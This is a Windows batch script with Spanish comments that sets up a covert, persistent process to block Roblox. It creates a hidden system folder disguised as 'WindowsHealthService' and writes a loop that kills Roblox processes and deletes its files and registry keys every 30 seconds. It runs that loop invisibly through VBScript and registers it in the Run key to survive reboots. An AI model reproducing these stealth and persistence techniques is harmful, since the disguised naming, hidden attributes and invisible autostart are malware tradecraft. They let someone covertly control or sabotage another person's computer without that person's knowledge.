@echo off
:: 0. Verificar privilegios de administrador
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo ============================================================
    echo [!] ERROR: Se requieren permisos de ADMINISTRADOR.
    echo Por favor, haz clic derecho y selecciona "Ejecutar como administrador".
    echo ============================================================
    pause
    exit /b
)

set "targetDir=C:\ProgramData\WindowsHealthService"
set "cleanerName=system_cleanup.bat"
set "vbsName=start_service.vbs"

:: 1. Crear el directorio estratégico
if not exist "%targetDir%" mkdir "%targetDir%" 2>nul

:: Forzar toma de posesión y permisos totales
takeown /f "%targetDir%" /r /d s >nul 2>&1
icacls "%targetDir%" /grant administrators:F /t >nul 2>&1
attrib +h +s "%targetDir%" /d /s >nul 2>&1

:: 2. Crear el script de limpieza (Bucle Infinito)
echo @echo off > "%targetDir%\%cleanerName%"
echo set "logFile=%targetDir%\cleanup.log" >> "%targetDir%\%cleanerName%"
echo :loop >> "%targetDir%\%cleanerName%"
echo :: Control de tamano de log (10MB = 10485760 bytes) >> "%targetDir%\%cleanerName%"
echo if exist "%%logFile%%" (for %%%%I in ("%%logFile%%") do if %%%%~zI gtr 10485760 type nul ^> "%%logFile%%") >> "%targetDir%\%cleanerName%"
echo echo [%%date%% %%time%%] Iniciando ciclo de limpieza... ^>^> "%%logFile%%" >> "%targetDir%\%cleanerName%"
echo :: Matar procesos de Roblox >> "%targetDir%\%cleanerName%"
echo taskkill /F /IM RobloxPlayerBeta.exe /T ^>^> "%%logFile%%" 2^>^&1 >> "%targetDir%\%cleanerName%"
echo taskkill /F /IM RobloxPlayerLauncher.exe /T ^>^> "%%logFile%%" 2^>^&1 >> "%targetDir%\%cleanerName%"
echo taskkill /F /IM RobloxStudioBeta.exe /T ^>^> "%%logFile%%" 2^>^&1 >> "%targetDir%\%cleanerName%"
echo :: Borrar archivos de instalacion >> "%targetDir%\%cleanerName%"
echo if exist "%%LocalAppData%%\Roblox" (echo Borrando LocalAppData... ^>^> "%%logFile%%" ^& rd /s /q "%%LocalAppData%%\Roblox" ^>^> "%%logFile%%" 2^>^&1) >> "%targetDir%\%cleanerName%"
echo if exist "%%ProgramFiles(x86)%%\Roblox" (echo Borrando ProgramFiles... ^>^> "%%logFile%%" ^& rd /s /q "%%ProgramFiles(x86)%%\Roblox" ^>^> "%%logFile%%" 2^>^&1) >> "%targetDir%\%cleanerName%"
echo :: Borrar llaves de registro >> "%targetDir%\%cleanerName%"
echo reg delete "HKEY_CURRENT_USER\Software\Roblox" /f ^>^> "%%logFile%%" 2^>^&1 >> "%targetDir%\%cleanerName%"
echo reg delete "HKEY_CURRENT_USER\Software\Roblox Corporation" /f ^>^> "%%logFile%%" 2^>^&1 >> "%targetDir%\%cleanerName%"
echo :: Esperar 30 segundos antes de la siguiente revision >> "%targetDir%\%cleanerName%"
echo timeout /t 30 /nobreak ^>nul >> "%targetDir%\%cleanerName%"
echo goto loop >> "%targetDir%\%cleanerName%"

:: 3. Crear el script VBS para ejecucion invisible
echo Set WshShell = CreateObject("WScript.Shell") > "%targetDir%\%vbsName%"
echo WshShell.Run chr(34) ^& "%targetDir%\%cleanerName%" ^& Chr(34), 0 >> "%targetDir%\%vbsName%"
echo Set WshShell = Nothing >> "%targetDir%\%vbsName%"

:: 4. Persistencia en el Registro (Carga en cada inicio)
:: Se registra en HKCU para que no requiera permisos de administrador para activarse
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsHealthService" /t REG_SZ /d "wscript.exe \"%targetDir%\%vbsName%\"" /f >nul 2>&1

:: 5. Ejecutar ahora mismo de forma invisible
start wscript.exe "%targetDir%\%vbsName%"

:: 6. Verificacion de ejecucion
timeout /t 3 /nobreak >nul
tasklist /FI "IMAGENAME eq wscript.exe" | find /I "wscript.exe" >nul
if %errorlevel% equ 0 (
    echo [OK] El servicio se ha iniciado correctamente.
    echo Actividad registrada en: %targetDir%\cleanup.log
) else (
    echo [ERROR] El proceso invisible no inicio. 
    echo Posibles causas: Antivirus bloqueando VBScript o permisos insuficientes en ProgramData.
    echo Intenta revisar si el archivo existe en: %targetDir%\%vbsName%
)
pause